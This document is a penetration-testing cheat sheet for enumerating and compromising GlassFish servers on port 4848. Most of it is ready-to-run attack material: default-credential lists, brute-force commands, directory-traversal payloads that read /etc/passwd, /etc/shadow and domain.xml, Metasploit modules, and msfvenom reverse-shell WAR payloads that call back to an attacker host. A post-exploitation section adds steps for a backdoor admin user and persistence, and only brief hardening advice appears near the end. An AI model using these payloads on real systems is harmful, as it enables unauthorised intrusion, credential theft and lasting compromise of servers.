# GLASSFISH ENUMERATION (Port 4848)

## SERVICE OVERVIEW
```
GlassFish is an open-source Java EE application server
- Default admin port: 4848 (HTTPS)
- Web applications on port 8080/8181
- Enterprise Java application server
- Admin console on port 4848
- Multiple known vulnerabilities
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p4848 <IP>                             # Service/Version detection
curl -k -I https://<IP>:4848                     # HTTPS headers
curl -k https://<IP>:4848 | grep -i "glassfish\|version"
openssl s_client -connect <IP>:4848              # SSL connection
```

## GLASSFISH DETECTION
```bash
# Detect GlassFish
curl -k https://<IP>:4848 | grep -i glassfish
curl -k -I https://<IP>:4848 | grep -i server

# GlassFish admin console
curl -k https://<IP>:4848/                       # Admin console login
curl -k https://<IP>:4848/login.jsf              # Login page
curl -k https://<IP>:4848/common/index.jsf       # Admin interface

# Version detection
curl -k https://<IP>:4848 | grep -oP 'GlassFish Server [0-9]+\.[0-9]+'
nmap -sV -p4848 <IP> | grep -i glassfish
```

## SSL/TLS SECURITY TESTING
```bash
# SSL certificate enumeration
openssl s_client -connect <IP>:4848 2>/dev/null | openssl x509 -noout -text
nmap -p4848 --script ssl-cert <IP>

# SSL/TLS testing
testssl.sh https://<IP>:4848
sslscan <IP>:4848
nmap --script ssl-enum-ciphers -p4848 <IP>
```

## DEFAULT CREDENTIALS
```bash
# Common GlassFish default credentials
admin:admin
admin:adminadmin
admin:changeit
admin:password
admin:glassfish
admin:(empty password)

# Test login
curl -k -d "j_username=admin&j_password=admin" https://<IP>:4848/j_security_check
curl -k -u admin:admin https://<IP>:4848/management/domain.xml

# Note: GlassFish may have no password set by default!
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l admin -P passwords.txt -s 4848 <IP> https-form-post "/j_security_check:j_username=^USER^&j_password=^PASS^:F=error"

# Custom script
for pass in admin password adminadmin changeit glassfish; do
    echo "Testing: $pass"
    curl -k -d "j_username=admin&j_password=$pass" https://<IP>:4848/j_security_check -L | grep -q "Common Tasks" && echo "[+] Valid: admin:$pass"
done
```

## VULNERABILITY SCANNING
```bash
# Search for GlassFish exploits
searchsploit glassfish
searchsploit "oracle glassfish"

# Known GlassFish CVEs:
# CVE-2011-0807: Directory traversal
# CVE-2017-1000028: Remote code execution
# CVE-2020-2950: Authentication bypass
# CVE-2020-2952: Authentication bypass
# CVE-2021-2394: JNDI injection
# CVE-2022-21371: Multiple vulnerabilities

nmap -p4848 --script vuln <IP>
```

## DIRECTORY TRAVERSAL (CVE-2011-0807)
```bash
# Path traversal vulnerability (old versions)
curl -k "https://<IP>:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"

# Alternative encoding
curl -k "https://<IP>:4848/theme/META-INF/..%252F..%252F..%252F..%252F..%252Fetc/passwd"

# Read sensitive files
curl -k "https://<IP>:4848/theme/META-INF/../../../../../../etc/shadow"
curl -k "https://<IP>:4848/theme/META-INF/../../../../../../opt/glassfish/glassfish/domains/domain1/config/domain.xml"
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/glassfish_traversal   # Directory traversal
use exploit/multi/http/glassfish_deployer        # WAR deployment RCE
use auxiliary/scanner/http/glassfish_login       # Login scanner
use exploit/multi/http/glassfish_passwordfile    # Password file disclosure
set RHOSTS <IP>
set RPORT 4848
set SSL true
run
```

## AUTHENTICATED RCE (WAR DEPLOYMENT)
```bash
# After successful login, deploy malicious WAR file

# Method 1: Via admin console
# 1. Login to https://<IP>:4848
# 2. Navigate to Applications -> Deploy
# 3. Upload malicious WAR file
# 4. Access deployed app on port 8080

# Method 2: Via asadmin command-line (if accessible)
asadmin deploy --user admin --passwordfile password.txt shell.war

# Method 3: Metasploit
msfconsole
use exploit/multi/http/glassfish_deployer
set RHOSTS <IP>
set RPORT 4848
set SSL true
set USERNAME admin
set PASSWORD admin
set LHOST <attacker_IP>
set payload java/meterpreter/reverse_tcp
exploit
```

## CREATE MALICIOUS WAR FILE
```bash
# Create reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war > shell.war

# Or use msfvenom for Meterpreter
msfvenom -p java/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war > meter.war

# Then deploy via admin console or API
```

## DOMAIN.XML PASSWORD EXTRACTION
```bash
# GlassFish stores encrypted passwords in domain.xml
# Location: /opt/glassfish/glassfish/domains/domain1/config/domain.xml

# Read domain.xml (via traversal or after access)
curl -k "https://<IP>:4848/theme/META-INF/../../../../../../opt/glassfish/glassfish/domains/domain1/config/domain.xml"

# Extract encrypted password
grep -oP '(?<=<admin-password>)[^<]+' domain.xml

# Decrypt password (requires master password from master-password file)
# Or use asadmin decrypt
```

## ENUMERATION ENDPOINTS
```bash
# Common GlassFish admin endpoints
curl -k https://<IP>:4848/                       # Admin console
curl -k https://<IP>:4848/login.jsf              # Login page
curl -k https://<IP>:4848/management/domain.xml  # Domain config
curl -k https://<IP>:4848/monitoring            # Monitoring
curl -k https://<IP>:4848/common/index.jsf       # Admin index

# REST API
curl -k -u admin:admin https://<IP>:4848/management/domain/version
curl -k -u admin:admin https://<IP>:4848/management/domain/applications
curl -k -u admin:admin https://<IP>:4848/management/domain/resources
```

## INFORMATION DISCLOSURE
```bash
# Version disclosure
curl -k https://<IP>:4848 | grep -i "version\|glassfish"

# Error messages may reveal paths
curl -k https://<IP>:4848/nonexistent

# Server header
curl -k -I https://<IP>:4848 | grep -i server

# Look for exposed files
curl -k https://<IP>:4848/robots.txt
curl -k https://<IP>:4848/sitemap.xml
```

## COMMON MISCONFIGURATIONS
```
☐ Default credentials (admin:admin)             # Easy access
☐ No password set for admin                      # Blank password
☐ Admin console exposed to internet              # Should be internal only
☐ Old vulnerable version                         # Known exploits
☐ Weak SSL/TLS configuration                     # Cryptographic attacks
☐ Directory traversal enabled                    # File disclosure
☐ No IP restrictions                             # Anyone can access
☐ Verbose error messages                         # Information leakage
☐ Debug mode enabled                             # Additional attack surface
```

## QUICK WIN CHECKLIST
```
☐ Check GlassFish version
☐ Test default credentials (admin:admin, admin:)
☐ Test for directory traversal (CVE-2011-0807)
☐ Try to read domain.xml
☐ Brute force admin password
☐ Check for authentication bypass vulns
☐ Test WAR deployment (if authenticated)
☐ Look for password file disclosure
☐ Check SSL/TLS configuration
☐ Search for version-specific exploits
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive GlassFish scan
nmap -sV -p4848 --script "ssl-* and http-*" -oA glassfish_enum <IP>

# Quick version check
curl -k https://<IP>:4848 | grep -oP 'GlassFish Server [0-9]+\.[0-9]+'

# Test directory traversal
curl -k "https://<IP>:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
```

## POST-EXPLOITATION (After Admin Access)
```bash
# 1. Deploy web shell WAR
# Upload shell.war via admin console

# 2. Access deployed shell
curl http://<IP>:8080/shell/

# 3. Create admin user via asadmin (if command-line access)
asadmin create-file-user --groups admin backdoor
asadmin set-web-context-param --name backdoor --value enabled

# 4. Read sensitive files
# domain.xml - Configuration
# master-password - Master password
# keystore.jks - SSL certificate keystore
# domain-passwords - Password file

# 5. Establish persistence
# Deploy backdoor WAR
# Create new admin user
# Modify startup scripts
```

## CONFIGURATION FILES
```bash
# Important GlassFish files
/opt/glassfish/glassfish/domains/domain1/config/domain.xml           # Main config
/opt/glassfish/glassfish/domains/domain1/master-password             # Master password
/opt/glassfish/glassfish/domains/domain1/config/admin-keyfile        # Admin key
/opt/glassfish/glassfish/domains/domain1/config/keystore.jks         # SSL keystore
/opt/glassfish/glassfish/domains/domain1/logs/server.log             # Server logs
/opt/glassfish/glassfish/domains/domain1/applications/               # Deployed apps
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Default credentials often used
2. Admin console exposed to internet
3. Directory traversal vulnerabilities
4. WAR deployment = RCE
5. Weak authentication
6. Password files readable
7. Multiple CVEs with RCE
8. Full server control if compromised
9. Can deploy malicious Java applications

RECOMMENDATION:
- Change default credentials immediately
- Restrict admin console to localhost/VPN
- Update to latest version
- Enable strong authentication
- Use firewall to block port 4848
- Monitor for unauthorized deployments
- Disable if not needed
- Regular security audits
```

## GLASSFISH VS OTHER APP SERVERS
```
GlassFish:
- Open-source
- Reference implementation of Java EE
- Admin port: 4848
- Web port: 8080/8181

Tomcat:
- Lighter weight
- Servlet container only
- Manager port: 8080/manager

JBoss/WildFly:
- Red Hat backed
- Admin port: 9990
- Web port: 8080

WebLogic:
- Oracle commercial
- Admin port: 7001
- More enterprise features
```
